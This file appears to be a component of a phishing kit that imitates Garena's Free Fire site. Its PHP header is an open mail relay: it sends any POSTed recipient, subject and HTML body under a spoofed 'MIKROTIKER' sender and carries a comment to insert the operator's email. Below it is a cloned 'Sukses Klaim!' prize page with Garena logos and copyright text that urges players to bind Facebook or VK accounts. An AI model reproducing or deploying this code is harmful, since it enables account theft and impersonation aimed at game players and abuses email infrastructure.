<?php


$tomail= $_POST['tomail'];
$subjec= $_POST['subject'];
$isiemail = $_POST['message'];


$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");
$link = $_SERVER['SERVER_NAME'];
$browser = $_SERVER['HTTP_USER_AGENT'];

$emailkamu = $tomail; //GANTI EMAILMU DIMARI

$subject = $subjec;
$message = $isiemail;


$headersx  = 'MIME-Version: 1.0' . "\r\n";
$headersx .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headersx .= 'From: MIKROTIKER  <mikrotikermail@gmail.com>' . "\r\n";
$datamail = mail($tomail,$subject, $message, $headersx);
?>

<!DOCTYPE html>
<html lang="zh">


<meta http-equiv="content-type" content="text/html;charset=utf-8" />
<head>
	<meta name="title" content="FreeFire">
    <meta name="description" content="FreeFire">
    <meta property="og:title" content="FreeFire">
    <meta property="og:description" content="FreeFire">
	</script>
	<link rel="stylesheet" href="https://ff.garena.com/statics/ff/css/common/reset.css">
	<link rel="stylesheet" href="https://ff.garena.com/statics/ff/css/common.css">  
    <link rel="stylesheet" href="https://ff.garena.com/statics/ff/css/swiper.css">
    <link rel="stylesheet" href="https://ff.garena.com/statics/ff/css/firepass/season02.css">
    <!-- M002 V3 -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- set if need to be able scaled -->
    <meta name="description" content="">
    <meta name="author" content="">
    <meta name="title" content="FreeFire">
    <meta name="description" content="FreeFire">
    <meta property="og:title" content="FreeFire">
    <meta property="og:description" content="FreeFire">
    <title>Free Fire</title>
    <link rel="shortcut icon" href="https://ff.garena.tw/static/favicon.ico" type="image/x-icon">
    <link rel="stylesheet" href="css/reset.css" />
    <!-- Bootstrap core CSS -->
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <link href="css/ie10-viewport-bug-workaround.css" rel="stylesheet">
    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
    <link href="css/all.css" rel="stylesheet">
    <link href="css/extra.css" rel="stylesheet">
    <!-- the css editable in USE -->
</head>
<div data-reactroot="">
<div class="container">
<div class="a_wrap2">
<div class="col-md-5 col-sm-5 col-xs-5">
<img src="imgg/logoff.png" class="gamelogo">
</div><div class="col-md-5 col-sm-5 col-xs-5">
<img src="imgg/garena.png" class="garenalogo"></div><span class="cit topics col-md-12 col-sm-12 col-xs-12">Sukses Klaim!</span></div><div class="a_wrap"><div></div>
<br><div><div></a></span></div>

<br>
<br><div><div></a></span></div>
<p><h5>Succes Claim!</h5></p>
</div><div class="more"><ol>
<li><!-- react-text: 18 -->1. Selamat Hadiah Telah Di Klaim </li>
<li><!-- react-text: 22 -->2. Silahkan Tunggu Hadiah Anda Dalam Beberapa Hari </li>
<br>
<li>Ingat: Kamu Tidak Bisa Klaim Hadiah Jika Anda Menggunakan Akun Guest. Silakan Bind Akun Anda Terlebih Dahulu Ke Facebook atau VK Untuk Menerima Hadiah</li>
<br>
<center><a href="index.php" class="button"><img src="imgg/logout.png" </center>
</div></div></div></div>

<br>

<br>

<br>
<body>
<div class="g-footer clearFix">
    <div class="m-foot-wrap">
 <div class="m-foot-copyright">
            <div class="m-foot-logo"><img src="http://freefiremobile-a.akamaihd.net/ffwebsite/images/logo_small_foot.png"></div>
            <div class="txt">Copyright © Garena International.<br>Trademarks belong to their respective owners. All rights Reserved.</div>
    <div id="app"></div>

</html>